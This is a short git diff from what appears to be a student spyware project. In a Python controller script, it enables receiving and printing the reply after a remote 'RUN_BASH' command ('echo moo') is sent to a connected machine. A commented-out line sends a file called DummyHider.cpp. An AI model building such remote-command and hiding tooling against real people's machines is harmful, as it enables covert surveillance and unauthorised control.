@@ -15,9 +15,9 @@ def main():
     serv = Server()
     with serv.serverConnection(HOST, PORT) as conn:
         serv.sendCommand(conn, FunCode["RUN_BASH"], "echo moo")
+        ans = serv.recvCommand(conn)
+        print(f"{ans = }")
         # serv.sendFile(conn, "/home/avner/Arazim-Projects-2024---spyware/src/ServerSpy/DummyHider.cpp")
-        # ans = serv.recvCommand(conn)
-        # print(f"{ans = }")
 
 
 
